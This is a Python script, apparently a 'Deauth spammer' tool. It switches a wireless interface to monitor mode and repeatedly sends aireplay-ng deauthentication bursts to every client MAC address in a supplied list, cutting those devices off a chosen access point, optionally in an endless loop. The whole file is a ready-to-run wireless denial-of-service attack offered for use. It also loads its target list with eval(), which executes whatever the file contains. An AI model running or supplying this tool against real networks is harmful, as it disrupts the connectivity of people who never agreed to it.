import os
from optparse import *
from pwn import *

#ctr+c
def signal_handler(signal, frame):
  sys.exit(0)

#Log functionality
def pwn_start():
    log.info('Deauth spammer')
    return log.progress('')

#Reading the set with MAC addresses
def read_file(file):
    file = open(file, "r")
    processed_file = eval(file.read())
    file.close()
    return processed_file

#Function to setting up the antena in monitor mode
def getting_started(interface,channel):
    os.system(f'airmon-ng start {interface}  > /dev/null ')
    question = input('Interface changed to monitor mode. Did the name change? (y/n): ')
    if question == 'y':
        interface = input('What is the name?: ')
    if channel==False:
        channel = int(input(f'What is the channel of the network? (You can use iw \'wlan0 info | grep "channel"\' to know that): '))
    #Some antenas needs this command to work fine
    os.system(f'aireplay-ng --test {interface} > /dev/null &')
    return interface,channel

#Function to perfom the attack
def attack(channel,bssid,interface,set,count):
    if len(set)<10:
        for i in set:
            count = attacking_loop(count,i,interface,channel,bssid)
        return count
    else:
        aux_array = []
        for i in set:
            aux_array.append(i)
        while len(aux_array) > 10:
            for i in range(10):
                target = aux_array[0]
                progress.status(f'{count}/{len(set)} Attacking: {target}')
                count = attacking_loop(count,target,interface,channel,bssid)
                aux_array.remove(target)
            time.sleep(1)
        attack(channel,bssid,interface,aux_array,count)

def attacking_loop(count,target,interface,channel,bssid):
    progress.status(f'{count}/{len(set)} Attacking: {target}')
    for i in range(3):
        os.system(f'sudo iwconfig {interface} channel {channel} > /dev/null && sudo aireplay-ng -0 5 -a {bssid} -c {target} {interface} > /dev/null &')
    time.sleep(1)
    count += 1
    return count

signal.signal(signal.SIGINT, signal_handler)    

#Flags
usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser()
parser.add_option("-f", "--file", action="store", type="str", dest="file",help="Set the file with MAC addresses")
parser.add_option("-i", "--interface", action="store", type="str", dest="interface",help="Interface to use (e.g. wlan1)")
parser.add_option("-b", "--bssid", action="store", type="str", dest="bssid",help="MAC of the access point")
parser.add_option("-c", "--channel", action="store", type="int", dest="channel", default=False,help="Channel used for the network")
parser.add_option("-l", "--loop", action="store_true", dest="loop", default=False,help="Set to True if you want to continue looping through the mac addresess")

(options, args) = parser.parse_args()
file = options.file
interface = options.interface
channel = options.channel
bssid = options.bssid
loop = options.loop

#Here are all the variables that call the function to start the attack
set = read_file(file)
print(f'Total MACs: {len(set)}')
interface,channel = getting_started(interface,channel)
progress = pwn_start()

if loop: 
    question = 'n'
else:
    question = 'y'
    
counter = 0

while question:
    attacking = attack(channel,bssid,interface,set,counter)
    progress.status(f'Attacked {len(set)} MACs')
    if question == 'y':
        end = input('Continue attacking? (y/n): ')
        if end == 'n':
            break
    print('')
    progress = pwn_start()

#Finishing
progress.status(f'Attack finished {len(set)} MACs affected')
time.sleep(5)
os.system(f'airmon-ng stop {interface} > /dev/null')
